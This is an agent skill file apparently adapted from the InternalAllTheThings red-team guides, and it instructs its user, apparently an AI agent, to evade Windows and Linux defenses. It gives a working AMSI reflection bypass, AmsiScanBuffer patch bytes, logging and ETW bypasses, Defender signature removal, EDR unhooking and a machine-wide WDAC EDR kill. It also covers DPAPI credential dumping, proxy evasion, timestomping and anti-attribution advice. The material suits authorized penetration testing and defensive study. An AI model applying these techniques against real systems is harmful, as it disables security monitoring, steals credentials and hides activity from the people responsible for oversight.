---
name: redteam-defense-evasion
description: >-
  Evade Windows and Linux defenses: AMSI bypass, PowerShell and ETW logging evasion, Windows
  Defender and AppLocker/WDAC bypass, EDR unhooking and direct syscalls, DPAPI secret extraction,
  proxy traversal and OPSEC failure avoidance. Use when a payload is blocked, when you must reduce
  telemetry, when dumping DPAPI secrets, or when reviewing OPSEC before an operation.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "11"
  generated-by: build/build.py
---

# Defense Evasion (AMSI, Defender, EDR)

Every control sits at a layer: script engine (AMSI, Constrained Language Mode, script-block
logging), process (ETW/ETWTI, call-stack inspection, memory permissions, parent-child lineage),
kernel (driver callbacks), host policy (AppLocker, WDAC, Defender, ASR, UAC) or network (proxy,
TLS, protocol shape). The right bypass matches the layer that blocked you — patching AMSI does
nothing for a WDAC policy. Done means the payload runs and the telemetry is below the level a
defender can act on.

## When to use this skill

- A payload, script or macro was blocked and you must identify which control caught it.
- You must reduce telemetry: PowerShell logging, ETW, Defender scanning, EDR user-mode hooks.
- You need DPAPI-protected secrets — Credential Manager blobs, browser credentials, master keys.
- Egress is filtered by a proxy or DPI device and you need a reachable path or protocol.
- You are doing a pre-engagement or mid-operation OPSEC review of infrastructure and behaviour.
- Payload delivery mechanics are `redteam-initial-access`; persistence triggers are
  `redteam-persistence`; C2 profile and redirector choices are `c2-frameworks`.

## First moves

1. **Identify which AMSI provider is installed and what backs it.** The CLSID resolves to the
   vendor's AMSI DLL:

   ```powershell
   Get-ChildItem -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\'
   Get-ChildItem -Path 'HKLM:\SOFTWARE\Classes\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}'
   ```

2. **Check the two script-engine constraints before bypassing anything.** Language mode decides
   whether .NET calls are allowed at all; execution policy is a weaker, separate gate:

   ```powershell
   $ExecutionContext.SessionState.LanguageMode
   Get-ExecutionPolicy
   ```

3. **Test the cheapest AMSI bypass in-process.** This clears `amsiInitFailed` for the current
   runspace only — a new `powershell.exe` starts clean:

   ```powershell
   [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
   ```

4. **Enumerate the logging that will record you.** `logman` shows AMSI/PowerShell ETW providers and,
   per PID, which provider sessions your process has open:

   ```powershell
   logman query providers Microsoft-Antimalware-Scan-Interface
   logman query providers -pid <PID>
   ```

5. **Read Defender's state and exclusions before touching it.** Exclusions from the customer's own
   tooling are free cover:

   ```powershell
   Get-MpComputerStatus
   Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess
   ```

6. **Check UAC's real configuration.** These three values decide whether a UAC bypass is needed at
   all:

   ```powershell
   REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
   REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v FilterAdministratorToken
   ```

7. **Enumerate DPAPI material before dumping.** Vault names and blob directories tell you which key
   you need:

   ```powershell
   vaultcmd /list
   dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
   ```

## Reference map

| Reference | Read it when | Key content |
|---|---|---|
| [amsi-bypass-techniques.md](references/amsi-bypass-techniques.md) | a script is caught by AMSI and you need a method | provider enumeration, rasta-mouse `AmsiScanBuffer` patch, egghunter patch, `AmsiUtils` reflection methods, reflected-assembly buffer patch, forcing an error, disabling script-block logging, PowerShell v2 |
| [amsi-bypass-variants.md](references/amsi-bypass-variants.md) | the known one-liners are signatured | Adam Chester x64/x86 patch, obfuscated reflection one-liner, amsi.fail snippets |
| [amsi-bypass-payload-1.md](references/amsi-bypass-payload-1.md) | you want one script implementing six methods | Nishang `Invoke-AmsiBypass`, `-Method unload/unload2/unloadsilent/unloadobfuscated/dllhijack/psv2` — ~16k tokens, **grep for `$Method`, do not read end to end** |
| [amsi-bypass-payload-2.md](references/amsi-bypass-payload-2.md) | same as above — this is a duplicate copy | identical Nishang script; read one, grep the other |
| [windows-defenses.md](references/windows-defenses.md) | you must know what host policy allows | AppLocker enumeration and bypass classes, UAC levels and auto-elevate binaries, PowerShell policy/CLM/logging/transcripts/SecureString, PPL, Credential Guard, ETW providers and ETWTI, ASR rule IDs, Defender, WDAC, firewall, WIP, BitLocker |
| [edr-bypass.md](references/edr-bypass.md) | the block is behavioural, not signature-based | mechanism → bypass map (static, UBA, user-mode hooks, call stack, process analysis, kernel callbacks), WDAC-kill-EDR via `SiPolicy.p7b`/Krueger |
| [elastic-edr.md](references/elastic-edr.md) | you need a lab to test the payload | Elastic container stack, Fleet enrolment, Prevent→Detect, memory-protection collection flags |
| [windows-dpapi.md](references/windows-dpapi.md) | you have blob files and need plaintext | `vaultcmd`, credential directories, LocalMachine vs CurrentUser, `dpapi::cred` + `sekurlsa::dpapi`, domain backup keys, Hekatomb, DonPAPI |
| [proxy-bypass.md](references/proxy-bypass.md) | egress is filtered and you must reach the internet | proxy/PAC discovery, weak-regex URL bypass, Living Off Trusted Sites, User-Agent choice, domain fronting, protocol alternatives |
| [linux-evasion.md](references/linux-evasion.md) | the host is Linux | zero-width filename masquerading, history suppression, ANSI-hidden text, timestomping limits, `hidepid` |
| [opsec-fails.md](references/opsec-fails.md) | before or after an operation, to avoid attribution | DNS/certificate hygiene, default C2 certs, staging, behaviour failures (`whoami`, DCSync source, Kerberoast etype), GoPhish/Impacket/NetExec/AWS IOCs |

## Workflow

1. **Classify the block.** Script caught at execution → AMSI or CLM. File caught before execution →
   static signature. Session dies or the SOC calls → behavioural/ETW/EDR. Nothing reaches the
   internet → proxy/DPI. Blobs but no plaintext → DPAPI.
2. **Script layer.** AMSI: reflection (`amsiInitFailed`) first, `AmsiScanBuffer` byte patch if
   reflection is blocked, amsi.fail when every published one-liner is signatured. CLM: PowerShell v2
   if .NET 2.0.50727 exists, a path containing `System32`, or `rundll32 PowerShdll,main`. Execution
   policy: `-ep bypass` or `Set-ExecutionPolicy Bypass -Scope Process -Force`.
3. **Logging layer.** Patch ETW in the current session (`PSEtwLogProvider.etwProvider.m_enabled`)
   when script-block logging is on; it does not touch kernel-side ETWTI.
4. **Static layer.** Obfuscate strings and imports, resolve APIs dynamically to shrink the IAT, use
   API hashing; verify with DefenderCheck/gocheck and a lab EDR before delivery.
5. **Behavioural layer.** Avoid RWX regions (allocate RW, then flip to RX), break parent-child
   lineage, unhook user-mode APIs or use indirect syscalls. If the EDR must go, the WDAC
   `SiPolicy.p7b` plus reboot (or Krueger over SMB) is the documented last resort.
6. **Secrets branch.** Own session → `dpapi::cred` with a master key from `sekurlsa::dpapi`. Another
   user's blobs → domain backup key (`lsadump::backupkeys /export`, DonPAPI, Hekatomb) or Remote
   Credential Guard when the account has an SPN and you are SYSTEM.
7. **Network branch.** Discover the proxy (`netsh winhttp show proxy`,
   `DefaultConnectionSettings`), then pick a path: trusted-site/CDN egress, a second internal proxy,
   domain fronting, or another protocol. Profile construction is `c2-frameworks`.
8. **OPSEC review.** Re-read `opsec-fails.md` against the certificates, hostnames, staging and tool
   IOCs you actually built.

## Gotchas

- The `AmsiScanBuffer` patch bytes differ by architecture (x64 `B8 57 00 07 80 C3`, x86 adds
  `C2 18 00`), and the write needs `VirtualProtect` to `0x40`. Wrong architecture leaves AMSI intact.
- AMSI bypasses are per-process: any new `powershell.exe`, `powerpick`, `execute-assembly` host or
  spawned child starts with AMSI enabled again — plan the bypass inside each primitive.
- The `Net.WebClient` variants are patched upstream; do not spend time on them, and assume the
  reflection field names are the first thing a vendor hardens.
- PowerShell v2 avoids AMSI and CLM, but needs .NET 2.0.50727, and a host that still has v2 is itself
  an alert.
- The script-block logging bypass patches the in-memory provider for the current session only; the
  Group Policy setting and the event channel remain.
- `MpCmdRun.exe -RemoveDefinitions -All` only helps while the host has no internet — signatures come
  back on the next update.
- The WDAC kill is destructive: admin plus a reboot, and it disables EDR components machine-wide.
- Credential Guard changes the DPAPI path: the `msv1_0` dump needs Credential Guard off locally;
  Remote Credential Guard needs an SPN-enabled account, and SYSTEM for all sessions.
- Another user's DPAPI blobs cannot be decrypted with the local machine key — you need the domain
  backup key or the user's master key.
- Linux timestomping changes atime/mtime only; ctime and birth time still betray the file unless you
  move the system clock as root, and creating a file updates the parent directory's mtime.
- Proxy bypass via a weak URL regex depends on the proxy parsing `user:pass@host` differently from
  the destination; it fails on proxies that normalize the URL first.

## Authorized use

For authorized engagements only, with explicit permission and within the agreed scope. Disabling
security controls or removing EDR is a change to the target's defensive posture — confirm it is
inside the rules of engagement and record what was disabled.

## Source

Converted from the upstream InternalAllTheThings guides
(https://github.com/swisskyrepo/InternalAllTheThings), see NOTICE.md.
